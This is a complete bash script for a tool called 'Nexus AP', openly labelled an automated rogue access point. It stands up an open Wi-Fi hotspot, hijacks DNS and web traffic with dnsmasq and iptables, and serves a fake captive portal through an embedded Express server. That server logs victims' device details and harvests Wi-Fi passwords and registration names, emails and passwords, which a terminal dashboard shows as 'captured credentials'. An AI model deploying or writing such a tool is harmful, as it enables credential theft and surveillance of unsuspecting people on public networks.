#!/bin/bash

# ==========================================
# NEXUS AP - INDUSTRIAL GRADE CONFIGURATION
# ==========================================
# Determine running context (Local vs Installed)
if [[ "$0" == *"/usr/local/bin/"* ]]; then
    APP_HOME="/opt/nexus_ap"
else
    APP_HOME="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
fi

WORKSPACE="/tmp/nexus_workspace"
DNSMASQ_CONF="$WORKSPACE/dnsmasq.conf"
HOSTAPD_CONF="$WORKSPACE/hostapd.conf"
SERVER_JS="$WORKSPACE/server.js"
LOG_FILE="$WORKSPACE/debug.log"
CAPTURE_LOG="$APP_HOME/captured_data.log"
LEASES_FILE="$WORKSPACE/dnsmasq.leases"

INTERFACE="wlan0"
GATEWAY_IP="192.168.1.1"
NETMASK="255.255.255.0"

# Neon/Modern ANSI Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
WHITE='\033[1;37m'
NC='\033[0m' # No Color

# ==========================================
# DEPENDENCY CHECKER
# ==========================================
check_dependencies() {
    echo -e "${BLUE}[INFO]${NC} Verifying system requirements..."
    # Added 'iw' and 'net-tools' for better device status tracking
    local pkgs=("hostapd" "dnsmasq" "nodejs" "npm" "aircrack-ng" "iw" "net-tools")
    for pkg in "${pkgs[@]}"; do
        if ! command -v $pkg &> /dev/null; then
            echo -e "${YELLOW}[*] Installing missing package: $pkg...${NC}"
            apt-get install -y $pkg > /dev/null 2>&1 || { echo -e "${RED}[ERROR] Could not install $pkg.${NC}"; exit 1; }
        fi
    done
}

# ==========================================
# INSTALLATION SYSTEM
# ==========================================
install_tool() {
    clear
    
    # Check if already installed
    if [ -f "/usr/local/bin/nexus" ] && [ -d "/opt/nexus_ap" ]; then
        echo -e "${CYAN}  ███╗   ██╗███████╗██╗  ██╗██╗   ██╗███████╗${NC}"
        echo -e "${CYAN}  ████╗  ██║██╔════╝╚██╗██╔╝██║   ██║██╔════╝${NC}"
        echo -e "${MAGENTA}  ============================================${NC}"
        echo -e "${YELLOW}  [!] Nexus AP is already installed on your system!${NC}"
        
        read -p "$(echo -e ${GREEN}"  [?] Do you want to install this new update? (y/n): "${NC})" choice
        if [[ "$choice" != "y" && "$choice" != "Y" ]]; then
            echo -e "${GREEN}  [*] To run the tool, simply type: ${WHITE}sudo nexus${NC}"
            echo -e "${MAGENTA}  ============================================${NC}"
            exit 0
        fi
        clear
    fi

    echo -e "${CYAN}  ███╗   ██╗███████╗██╗  ██╗██╗   ██╗███████╗${NC}"
    echo -e "${CYAN}  ████╗  ██║██╔════╝╚██╗██╔╝██║   ██║██╔════╝${NC}"
    echo -e "${CYAN}  ██╔██╗ ██║█████╗   ╚███╔╝ ██║   ██║███████╗${NC}"
    echo -e "${CYAN}  ██║╚██╗██║██╔══╝   ██╔██╗ ██║   ██║╚════██║${NC}"
    echo -e "${CYAN}  ██║ ╚████║███████╗██╔╝ ██╗╚██████╔╝███████║${NC}"
    echo -e "${CYAN}  ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝${NC}"
    echo -e "${MAGENTA}  ============================================${NC}"
    echo -e "${YELLOW}  [*] Initializing System-Wide Installation...${NC}"
    echo ""
    
    check_dependencies
    
    mkdir -p /opt/nexus_ap
    
    # Setup Node packages globally during install
    echo -e "${YELLOW}  [*] Configuring Node.js environment & dependencies...${NC}"
    cat << 'EOF' > /opt/nexus_ap/package.json
{ "type": "module", "dependencies": { "express": "^4.18.2", "cors": "^2.8.5" } }
EOF
    (cd /opt/nexus_ap && npm install > /dev/null 2>&1)
    echo -e "${GREEN}  [+] Installed required Node modules globally.${NC}"

    # Check and move dist folder
    if [ -d "$APP_HOME/dist" ]; then
        cp -r "$APP_HOME/dist" /opt/nexus_ap/
        echo -e "${GREEN}  [+] Copied 'dist' UI assets to /opt/nexus_ap/dist${NC}"
    else
        echo -e "${RED}  [!] Warning: 'dist' folder not found in current directory. UI won't load properly.${NC}"
    fi

    # Create global command
    cp "$0" /usr/local/bin/nexus
    chmod +x /usr/local/bin/nexus
    
    # Touch log file to ensure permissions
    touch /opt/nexus_ap/captured_data.log
    chmod 666 /opt/nexus_ap/captured_data.log

    echo -e "${GREEN}  [+] Symlinked tool to /usr/local/bin/nexus${NC}"
    echo -e "${CYAN}  [*] Installation Complete! You can now run the tool from anywhere by typing: ${WHITE}sudo nexus${NC}"
    exit 0
}

# Check for installation flag
if [ "$1" == "install" ]; then
    if [ "$EUID" -ne 0 ]; then 
        echo -e "${RED}[ERROR] Installation requires root privileges. Use: sudo ./nexus_wifi_app.sh install${NC}"
        exit 1
    fi
    install_tool
fi

# ==========================================
# MODERN ANIMATED BANNER
# ==========================================
animated_banner() {
    clear
    local logo=(
        "  ███╗   ██╗███████╗██╗  ██╗██╗   ██╗███████╗"
        "  ████╗  ██║██╔════╝╚██╗██╔╝██║   ██║██╔════╝"
        "  ██╔██╗ ██║█████╗   ╚███╔╝ ██║   ██║███████╗"
        "  ██║╚██╗██║██╔══╝   ██╔██╗ ██║   ██║╚════██║"
        "  ██║ ╚████║███████╗██╔╝ ██╗╚██████╔╝███████║"
        "  ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝"
    )
    echo -e "${CYAN}"
    for line in "${logo[@]}"; do
        echo "$line"
        sleep 0.05
    done
    echo -e "${NC}"
    
    local subtitle="         AUTOMATED ROGUE AP DEPLOYMENT        "
    echo -ne "${MAGENTA}  ============================================\n  ${YELLOW}"
    for (( i=0; i<${#subtitle}; i++ )); do
        echo -ne "${subtitle:$i:1}"
        sleep 0.02
    done
    echo -e "\n${MAGENTA}  ============================================${NC}\n"
    sleep 0.3
}

static_banner() {
    echo -e "${CYAN}  ███╗   ██╗███████╗██╗  ██╗██╗   ██╗███████╗"
    echo "  ████╗  ██║██╔════╝╚██╗██╔╝██║   ██║██╔════╝"
    echo "  ██╔██╗ ██║█████╗   ╚███╔╝ ██║   ██║███████╗"
    echo "  ██║╚██╗██║██╔══╝   ██╔██╗ ██║   ██║╚════██║"
    echo "  ██║ ╚████║███████╗██╔╝ ██╗╚██████╔╝███████║"
    echo -e "  ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝${NC}"
}

log_info() { echo -e "${BLUE}[INFO]${NC} $1"; }
log_success() { echo -e "${GREEN}[SUCCESS]${NC} $1"; }
log_fail() { echo -e "${RED}[ERROR]${NC} $1"; restore_network; exit 1; }

# ==========================================
# DYNAMIC FILE GENERATION (Heredoc)
# ==========================================
generate_configs() {
    log_info "Building workspace and configuration files..."
    rm -rf "$WORKSPACE"
    mkdir -p "$WORKSPACE"
    touch "$LOG_FILE" "$CAPTURE_LOG" "$LEASES_FILE"
    chmod 666 "$CAPTURE_LOG"

    # Generating dnsmasq.conf (Added dhcp-leasefile for tracking)
    cat << EOF > "$DNSMASQ_CONF"
address=/#/192.168.1.1
interface=wlan0
dhcp-range=192.168.1.10,192.168.1.100,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
dhcp-leasefile=$LEASES_FILE

address=/apple.com/192.168.1.1
address=/captive.apple.com/192.168.1.1
address=/connectivitycheck.gstatic.com/192.168.1.1
address=/connectivitycheck.android.com/192.168.1.1
address=/clients3.google.com/192.168.1.1
address=/msftncsi.com/192.168.1.1
EOF

    # Generating hostapd.conf base template
    cat << 'EOF' > "$HOSTAPD_CONF"
interface=wlan0
driver=nl80211
ssid=TEMP_SSID
hw_mode=g
channel=TEMP_CHANNEL
auth_algs=1
wmm_enabled=0
EOF

    # Generating server.js
    cat << 'EOF' > "$SERVER_JS"
import express from 'express';
import fs from 'fs';
import cors from 'cors';
import path from 'path';

const app = express();
const PORT = 80;
const loggedClients = new Set();
const capturedPasswords = new Set();

// Resolve paths based on ENV vars set by Bash
const distPath = process.env.APP_HOME ? path.join(process.env.APP_HOME, 'dist') : path.join(process.cwd(), 'dist');
const logPath = process.env.CAPTURE_LOG || 'captured_data.log';

app.use(cors());
app.use(express.json());
app.use(express.static(distPath)); // Serve React UI

const getDeviceInfo = (ua = '') => {
    let os = 'Unknown OS', osVersion = '', device = 'Unknown Device', browser = 'Unknown Browser', browserVersion = '';
    if (ua.includes('Android')) { os = 'Android'; osVersion = (ua.match(/Android\s([\d.]+)/) || [])[1] || ''; device = (ua.match(/Android.*;\s([^)]+)\)/) || [])[1] || 'Mobile'; } 
    else if (ua.includes('iPhone')) { os = 'iOS'; device = 'iPhone'; } 
    else if (ua.includes('Windows')) { os = 'Windows'; device = 'PC'; } 
    else if (ua.includes('Macintosh')) { os = 'macOS'; device = 'Mac'; }
    if (ua.includes('Chrome') && !ua.includes('Edg')) { browser = 'Chrome'; browserVersion = (ua.match(/Chrome\/([\d.]+)/) || [])[1] || ''; }
    else if (ua.includes('Safari') && !ua.includes('Chrome')) browser = 'Safari';
    else if (ua.includes('Edg')) browser = 'Edge';
    return { os, osVersion, device, browser, browserVersion };
};

app.get('/api/network-info', (req, res) => {
    try {
        let ip = req.socket.remoteAddress.replace('::ffff:', '');
        const info = getDeviceInfo(req.headers['user-agent'] || '');
        
        if (!loggedClients.has(ip)) {
            loggedClients.add(ip);
            fs.appendFileSync(logPath, `CLIENT|${ip}|${info.device}|${info.os} ${info.osVersion}|${info.browser}\n`);
        }
        res.json({ ssid: JSON.parse(fs.readFileSync('network_config.json')).ssid });
    } catch(err) { console.error("Error logging client info", err); res.json({ ssid: "Network" }); }
});

app.post('/api/save-password', (req, res) => {
    try {
        let ip = req.socket.remoteAddress.replace('::ffff:', '');
        const password = req.body.password || req.body.pass || 'Unknown';
        if (!capturedPasswords.has(ip + password)) {
            capturedPasswords.add(ip + password);
            fs.appendFileSync(logPath, `CRED|${ip}|${new Date().toLocaleTimeString()}|WIFI_PASS|${password}\n`);
        }
        res.json({ ok: true });
    } catch(err) { console.error("Error saving pass", err); res.status(500).json({ error: "Storage error" }); }
});

app.post('/api/save-registration', (req, res) => {
    try {
        let ip = req.socket.remoteAddress.replace('::ffff:', '');
        const { name, email, password } = req.body;
        fs.appendFileSync(logPath, `CRED|${ip}|${new Date().toLocaleTimeString()}|REGISTRATION|N:${name} E:${email} P:${password}\n`);
        res.json({ ok: true });
    } catch(err) { res.status(500).json({ error: "Storage error" }); }
});

app.use((req, res) => res.sendFile(path.join(distPath, 'index.html')));

app.listen(PORT, '0.0.0.0', () => console.log('Server Live'));
EOF
}

# ==========================================
# LIVE TERMINAL DASHBOARD
# ==========================================
monitor_dashboard() {
    while true; do
        clear
        static_banner
        echo -e "${MAGENTA}  ═════════════════════════════════════════════════════════════════════════════════════════════${NC}"
        echo -e "${GREEN}      >>> ACCESS POINT LIVE: ${WHITE}${USER_SSID}${GREEN} | CHANNEL: ${WHITE}${USER_CHANNEL}${GREEN} <<<      ${NC}"
        echo -e "${MAGENTA}  ═════════════════════════════════════════════════════════════════════════════════════════════${NC}"
        echo ""
        
        # Connected Devices Table
        # Total Inner Width: 100 characters for better spacing
        echo -e "${BLUE}  ╭──[ CONNECTED DEVICES ]───────────────────────────────────────────────────────────────────────────────╮${NC}"
        printf "${BLUE}  │${NC}  %-15s  │  %-17s  │  %-15s  │  %-24s  │  %-8s ${BLUE}│${NC}\n" "IP ADDRESS" "MAC ADDRESS" "HOSTNAME" "OS / BROWSER" "STATUS"
        echo -e "${BLUE}  ├───────────────────┼─────────────────────┼───────────────────┼────────────────────────────┼───────────┤${NC}"
        
        # Fetch actual online MAC addresses using 'iw'
        active_macs=$(iw dev $INTERFACE station dump 2>/dev/null | grep Station | awk '{print $2}')

        if [ -s "$LEASES_FILE" ]; then
            while read -r expiry mac ip host client_id; do
                [ "$host" == "*" ] && host="Unknown"

                # Check real-time connection status
                if echo "$active_macs" | grep -qi "$mac"; then
                    status_col="${GREEN}"
                    status_txt="Online"
                else
                    status_col="${RED}"
                    status_txt="Offline"
                fi

                # Extract Device OS/Browser from captured log
                device_info=$(grep "CLIENT|$ip|" "$CAPTURE_LOG" | tail -n 1 | awk -F'|' '{print $4" ("$5")"}')
                [ -z "$device_info" ] && device_info="Analyzing..."

                # Format strings optimized with extra padding (2 spaces before/after separators)
                printf "${BLUE}  │${NC}  %-15s  │  %-17s  │  %-15s  │  %-24s  │ ${status_col}${NC}${BLUE}│${NC}\n" \
                    "$ip" "$mac" "${host:0:15}" "${device_info:0:24}" "$status_txt"
            done < "$LEASES_FILE"
        else
            # Centered waiting message
            printf "${BLUE}  │${NC} %-100s ${BLUE}│${NC}\n" " Waiting for devices to connect..."
        fi
        echo -e "${BLUE}  ╰──────────────────────────────────────────────────────────────────────────────────────────────────────╯${NC}"



        # Captured Credentials Table
        echo -e "\n${RED}  ╭──[ CAPTURED CREDENTIALS ]────────────────────────────────────────────────────────────────────╮${NC}"
        printf "${RED}  │${NC} ${YELLOW}%-10s${NC} │ ${YELLOW}%-15s${NC} │ ${YELLOW}%-12s${NC} │ ${YELLOW}%-46s${NC} ${RED}│${NC}\n" "TIME" "TARGET IP" "TYPE" "DATA"
        echo -e "${RED}  ├────────────┼─────────────────┼──────────────┼────────────────────────────────────────────────┤${NC}"
        
        if grep -q "CRED|" "$CAPTURE_LOG"; then
            grep "CRED|" "$CAPTURE_LOG" | tail -n 5 | while read -r line; do
                cred_ip=$(echo "$line" | cut -d'|' -f2)
                cred_time=$(echo "$line" | cut -d'|' -f3)
                cred_type=$(echo "$line" | cut -d'|' -f4)
                cred_val=$(echo "$line" | cut -d'|' -f5)
                printf "${RED}  │${NC} %-10s │ %-15s │ %-12s │ %-46s ${RED}│${NC}\n" "$cred_time" "$cred_ip" "$cred_type" "${cred_val:0:47}"
            done
        else
            printf "${RED}  │${NC} ${WHITE}%-92s${NC} ${RED}│${NC}\n" " No credentials captured yet..."
        fi
        echo -e "${RED}  ╰──────────────────────────────────────────────────────────────────────────────────────────────╯${NC}"
        
        sleep 2
    done
}

# ==========================================
# NETWORK CONTROL
# ==========================================
restore_network() {
    echo -e "\n${MAGENTA}[!] Commencing shutdown sequence...${NC}"
    pkill -f "node server.js" 2>/dev/null
    pkill dnsmasq 2>/dev/null
    pkill hostapd 2>/dev/null
    
    systemctl start NetworkManager
    systemctl start wpa_supplicant
    airmon-ng stop wlan0mon > /dev/null 2>&1
    
    iptables -F && iptables -t nat -F
    sysctl -w net.ipv4.ip_forward=0 > /dev/null
    
    # Cleanup workspace but keep captured logs
    rm -rf "$WORKSPACE"
    echo -e "${GREEN}[*] Network restored safely. Logs saved to: $CAPTURE_LOG${NC}"
    exit 0
}

trap restore_network SIGINT

# ==========================================
# MAIN EXECUTION
# ==========================================
if [ "$EUID" -ne 0 ]; then 
  echo -e "${RED}ACCESS DENIED: Please execute with root privileges (sudo).${NC}"
  exit
fi

animated_banner
check_dependencies
generate_configs

log_info "Setting up Node.js environment..."
# Automatically link or install NPM dependencies
if [ -d "/opt/nexus_ap/node_modules" ]; then
    ln -sf /opt/nexus_ap/node_modules "$WORKSPACE/node_modules"
    cp /opt/nexus_ap/package.json "$WORKSPACE/package.json" 2>/dev/null || true
else
    cat << 'EOF' > "$WORKSPACE/package.json"
{ "type": "module", "dependencies": { "express": "^4.18.2", "cors": "^2.8.5" } }
EOF
    (cd "$WORKSPACE" && npm install > /dev/null 2>&1)
fi

echo -e "\n${CYAN}--- TACTICAL DEPLOYMENT ---${NC}"
echo -e "${YELLOW}[?] Enter Desired Wi-Fi Name (SSID): ${NC}"
read -p "    > " USER_SSID
[ -z "$USER_SSID" ] && USER_SSID="Free Wifi"

echo -e "${YELLOW}[?] Enter Wi-Fi Channel (1-11) [Default: 6]: ${NC}"
read -p "    > " USER_CHANNEL
[ -z "$USER_CHANNEL" ] && USER_CHANNEL="6"

sed -i "s/TEMP_SSID/$USER_SSID/" "$HOSTAPD_CONF"
sed -i "s/TEMP_CHANNEL/$USER_CHANNEL/" "$HOSTAPD_CONF"
echo "{\"ssid\": \"$USER_SSID\"}" > "$WORKSPACE/network_config.json"

log_info "Isolating Network Interfaces..."
systemctl stop NetworkManager
systemctl stop wpa_supplicant
airmon-ng check kill > /dev/null 2>&1
pkill dnsmasq || true && fuser -k 53/udp || true && fuser -k 53/tcp || true > /dev/null 2>&1

ifconfig $INTERFACE $GATEWAY_IP netmask $NETMASK up
sysctl -w net.ipv4.ip_forward=1 > /dev/null
iptables -F && iptables -t nat -F

log_info "Configuring IPTables Routing..."
iptables -t nat -A PREROUTING -i $INTERFACE -p udp --dport 53 -j DNAT --to-destination $GATEWAY_IP:53
iptables -t nat -A PREROUTING -i $INTERFACE -p tcp --dport 53 -j DNAT --to-destination $GATEWAY_IP:53
iptables -t nat -A PREROUTING -i $INTERFACE -p tcp --dport 80 -j DNAT --to-destination $GATEWAY_IP:80
iptables -t nat -A PREROUTING -i $INTERFACE -p tcp --dport 443 -j DNAT --to-destination $GATEWAY_IP:80

log_info "Initializing Services..."
dnsmasq -C "$DNSMASQ_CONF" -d > /dev/null 2>&1 &

cd "$WORKSPACE"
if [ -d "$APP_HOME/dist" ] || [ "$APP_HOME" == "/opt/nexus_ap" ]; then
    APP_HOME="$APP_HOME" CAPTURE_LOG="$CAPTURE_LOG" node server.js >> "$LOG_FILE" 2>&1 &
else
    echo -e "${YELLOW}[!] Warning: dist folder not found. Captive portal UI will not load.${NC}"
fi
cd - > /dev/null

# Launch AP in background so we can run the dashboard in the foreground
hostapd "$HOSTAPD_CONF" > /dev/null 2>&1 &

# Start Live Dashboard
monitor_dashboard
